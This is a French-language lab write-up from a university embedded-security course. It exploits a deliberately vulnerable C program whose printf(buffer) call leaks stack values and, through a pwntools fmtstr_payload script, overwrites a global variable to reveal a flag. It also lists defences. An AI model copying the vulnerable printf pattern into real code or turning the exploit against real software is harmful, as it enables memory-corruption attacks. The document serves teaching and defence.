# Write-up — Lab 04 : Format String — Écriture en mémoire

> **Pilier 3 — Embarqué / C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![Format String](https://img.shields.io/badge/vuln-Format%20String-red.svg)]()
[![pwntools](https://img.shields.io/badge/pwntools-fmtstr__payload-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Vulnérabilité :** `printf(buffer)` — l'input utilisateur traité comme format string  
**Phase 1 :** Lecture mémoire via `%p` — localisation de l'input sur la stack (offset 6)  
**Phase 2 :** Écriture via `%n` — modification de `secret` de `0x0` vers `0xdeadbeef`  
**Flag :** `AngeVirus{format_string_write}`

---

## 2. Environnement

```text
OS      : WSL2 Ubuntu sur Windows 11 Pro
gcc     : -g -fno-stack-protector -no-pie -Wno-format-security
NX      : enabled (stack non-exécutable — pas de shellcode)
PIE     : No PIE (adresses fixes)
Canary  : absent
```

---

## 3. Code vulnérable — `target.c`

```c
int secret = 0;  // variable globale — cible de l'écriture

void win() {
    printf(">>> FLAG : AngeVirus{format_string_write} <<<\n");
}

int main() {
    char buffer[128];
    printf("secret est a l'adresse : %p\n", &secret);
    printf("Input : ");
    fgets(buffer, sizeof(buffer), stdin);
    buffer[strcspn(buffer, "\n")] = 0;

    printf(buffer);   // VULNERABLE : pas de format string fixe

    if (secret == 0xdeadbeef) {
        win();
    }
}
```

**La ligne dangereuse :** `printf(buffer)` — si l'input contient `%p`, `%x`, `%n`, printf les interprète comme des directives de format au lieu de les afficher.

---

## 4. Phase 1 — Lecture mémoire

```bash
echo "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p" | ./target
```

**Output :**
```
0x1.0x1.0xd.0x3f6b16ce.(nil).0x70252e70252e7025.0x252e70252e70252e...
```

La valeur `0x70252e70252e7025` = `%p.%p.%p.` en ASCII (little-endian).  
**Notre input apparaît à l'offset 6 sur la stack.**

Confirmation avec l'accès direct par position :

```bash
echo "%6\$p" | ./target
# → 0x70243625  (%6$p en ASCII) ✓
```

---

## 5. Phase 2 — Écriture avec `%n`

`%n` écrit le **nombre de caractères déjà imprimés** à l'adresse pointée par l'argument correspondant.

Exemple :
```
printf("%100c%1$n", &cible)
→ imprime 100 espaces, puis écrit 100 (0x64) dans cible
```

Faire ça manuellement pour `0xdeadbeef` = 3 735 928 559 caractères → impossible à la main.

---

## 6. Exploit pwntools — `exploit.py`

```python
from pwn import *

elf = ELF('./target')
context.binary = elf

secret_addr = elf.symbols['secret']
log.info(f"Adresse de secret : {hex(secret_addr)}")

OFFSET = 6

# fmtstr_payload construit automatiquement le payload d'ecriture
payload = fmtstr_payload(OFFSET, {secret_addr: 0xdeadbeef})

p = process('./target')
p.recvuntil(b'Input : ')
p.sendline(payload)

output = p.recvall(timeout=2)
log.success(output.decode(errors='replace'))
```

**Payload généré par pwntools :**
```
%239c%12$lln%190c%13$hhn%17c%14$hhn%32c%15$hhnaa\@@...
```

pwntools décompose `0xdeadbeef` en octets (`0xef`, `0xbe`, `0xad`, `0xde`) et écrit chacun séparément via `%hhn` (écriture d'un octet) aux adresses consécutives de `secret`.

---

## 7. Résultat

```
[*] Adresse de secret : 0x40405c
[+] Starting local process './target': pid 3543
[+] Valeur de secret : 0xdeadbeef
    >>> FLAG : AngeVirus{format_string_write} <<<
```

> Screenshot : [docs/lab04_fmtstr_exploit.png](docs/lab04_fmtstr_exploit.png)

---

## 8. Lecture vs Écriture

| Directive | Action | Usage offensif |
| --- | --- | --- |
| `%p` | Affiche un pointeur (hex) | Leak d'adresses stack/heap |
| `%x` | Affiche un entier hex | Lecture de données |
| `%s` | Lit une chaîne à l'adresse | Lecture de zones mémoire |
| `%n` | **Écrit** le compteur de chars | Modification de variables, GOT overwrite |
| `%hhn` | Écrit 1 octet | Écriture précise octet par octet |
| `%lln` | Écrit 8 octets | Écriture 64-bit |

---

## 9. Défense

| Vulnérabilité | Mesure |
| --- | --- |
| `printf(buffer)` | Toujours `printf("%s", buffer)` — jamais passer l'input comme format |
| Compilation | `-Wformat -Werror=format-security` détecte et bloque à la compilation |
| RELRO Full | Protège la GOT contre l'écrasement via `%n` |
| ASLR | Randomise les adresses — complique le ciblage |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Vulnérabilité | Format string — `printf(user_input)` |
| Offset input sur stack | 6 |
| Cible | `secret` @ `0x40405c` |
| Valeur écrite | `0xdeadbeef` |
| Technique | `%n` via `fmtstr_payload(6, {addr: value})` |
| NX | Enabled — shellcode impossible, format string fonctionne |
| Flag | `AngeVirus{format_string_write}` |

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
